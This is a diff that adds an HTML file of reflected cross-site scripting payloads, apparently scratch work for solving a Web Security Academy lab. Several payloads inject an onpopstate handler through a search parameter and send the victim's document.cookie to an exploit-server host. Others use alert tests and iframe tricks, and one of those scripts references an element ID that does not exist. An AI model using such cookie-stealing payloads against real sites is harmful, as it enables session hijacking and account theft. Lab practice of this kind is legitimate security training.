@@ -1,0 +1,46 @@
+<script>
+    window.location = 'https://0ab800360434066dc0178acf003f000a.web-security-academy.net/?SearchTerm=<body+onpopstate%3d"window.location=%27https://exploit-0a0100b204bd06a2c0fd8ab201eb00bd.web-security-academy.net/?session=document.cookie%27">'
+</script>
+
+<script>
+    window.location = 'https://0ab800360434066dc0178acf003f000a.web-security-academy.net/?SearchTerm=<body+onpopstate%3d"alert(document.cookie)">'
+</script>
+
+
+
+<iframe
+    src='https://0ab800360434066dc0178acf003f000a.web-security-academy.net/?SearchTerm=<body+onpopstate%3d"window.location=%27https://exploit-0a0100b204bd06a2c0fd8ab201eb00bd.web-security-academy.net/?session=document.cookie%27">'>
+</iframe>
+
+
+<script>
+    function a(iframe) {
+        console.log("inside onload")
+        console.log(iframe)
+
+        iframe.history.pushState({}, '', "/");
+        var popStateEvent = new PopStateEvent('popstate', { state: {} });
+        dispatchEvent(popStateEvent);
+    }
+</script>
+<iframe id="haha"
+    src='https://0ab800360434066dc0178acf003f000a.web-security-academy.net/?SearchTerm=<body+onpopstate%3d"alert(1)">'
+    onload="a(this)">
+</iframe>
+<script>
+    var iframe = document.getElementById('frameID'),
+        iframeWin = iframe.contentWindow || iframe,
+        iframeDoc = iframe.contentDocument || iframeWin.document;
+
+    window.hello = function () {
+        alert('hello from owner!');
+    };
+
+    $(iframeDoc).ready(function (event) {
+        iframeDoc.open();
+        iframeDoc.write('iframe here');
+        iframeDoc.write('\<script>alert("hello from iframe!");\<\/script>');
+        iframeDoc.write('\<script>parent.hello();\<\/script>');
+        iframeDoc.close();
+    });
+</script>
